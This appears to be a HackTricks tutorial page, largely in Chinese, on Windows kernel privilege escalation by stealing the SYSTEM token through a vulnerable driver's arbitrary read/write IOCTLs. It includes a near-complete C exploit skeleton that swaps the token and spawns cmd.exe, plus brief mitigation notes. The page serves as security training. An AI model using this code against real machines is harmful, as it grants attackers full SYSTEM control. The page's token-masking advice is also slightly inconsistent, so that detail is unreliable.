# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## 概述

如果一个有漏洞的驱动暴露了一个 IOCTL，使攻击者可以获得任意内核读写原语，那么通过窃取 SYSTEM 访问 token 往往可以提升为 NT AUTHORITY\SYSTEM。该技术将 SYSTEM 进程的 EPROCESS 中的 Token 指针复制到当前进程的 EPROCESS 中。

为什么可行：
- 每个进程都有一个 EPROCESS 结构，包含（除其他字段外）一个 Token（实际上是指向 token 对象的 EX_FAST_REF）。
- SYSTEM 进程（PID 4）持有一个启用所有权限的 token。
- 将当前进程的 EPROCESS.Token 替换为 SYSTEM 的 token 指针会立即使当前进程以 SYSTEM 身份运行。

> EPROCESS 中的偏移因 Windows 版本而异。请动态确定（symbols）或使用特定版本的常量。另请记住 EPROCESS.Token 是一个 EX_FAST_REF（低 3 位是引用计数标志）。

## 高层步骤

1) 定位 ntoskrnl.exe 基址并解析 PsInitialSystemProcess 的地址。
- 在用户态，可使用 NtQuerySystemInformation(SystemModuleInformation) 或 EnumDeviceDrivers 来获取已加载驱动的基址。
- 将 PsInitialSystemProcess 的偏移（来自符号/逆向）加到内核基址以得到其地址。
2) 读取 PsInitialSystemProcess 处的指针 → 这是指向 SYSTEM 的 EPROCESS 的内核指针。
3) 从 SYSTEM EPROCESS 读取 UniqueProcessId 和 ActiveProcessLinks 的偏移，通过双向链表遍历 EPROCESS 结构（ActiveProcessLinks.Flink/Blink），直到找到其 UniqueProcessId 等于 GetCurrentProcessId() 的 EPROCESS。保留两者：
- EPROCESS_SYSTEM（用于 SYSTEM）
- EPROCESS_SELF（用于当前进程）
4) 读取 SYSTEM token 值：Token_SYS = *(EPROCESS_SYSTEM + TokenOffset)。
- 掩码掉低 3 位：Token_SYS_masked = Token_SYS & ~0xF（通常是 ~0xF 或 ~0x7，取决于构建；在 x64 上低 3 位被使用 — 0xFFFFFFFFFFFFFFF8 的掩码）。
5) 选项 A（常见）：保留你当前 token 的低 3 位，并拼接到 SYSTEM 的指针上以保持嵌入的引用计数一致。
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) 使用你的内核写入原语将 Token_NEW 写回 (EPROCESS_SELF + TokenOffset)。
7) 现在你的当前进程已是 SYSTEM。可选地启动一个新的 cmd.exe 或 powershell.exe 以确认。

## 伪代码

下面是一个骨架，只使用来自有漏洞驱动的两个 IOCTL，一个用于 8 字节内核读取，一个用于 8 字节内核写入。请替换为你驱动的接口。
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
注意：
- Offsets: Use WinDbg’s `dt nt!_EPROCESS` with the target’s PDBs, or a runtime symbol loader, to get correct offsets. Do not hardcode blindly.
- Mask: On x64 the token is an EX_FAST_REF; low 3 bits are reference count bits. Keeping the original low bits from your token avoids immediate refcount inconsistencies.
- Stability: Prefer elevating the current process; if you elevate a short-lived helper you may lose SYSTEM when it exits.

## 检测与缓解
- 加载未签名或不受信任的第三方驱动且这些驱动暴露强大的 IOCTLs 是根本原因。
- Kernel Driver Blocklist (HVCI/CI)、DeviceGuard 和 Attack Surface Reduction 规则可以阻止易受攻击的驱动加载。
- EDR 可以监视实现任意读/写 的可疑 IOCTL 序列以及 token 交换行为。

## 参考资料
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
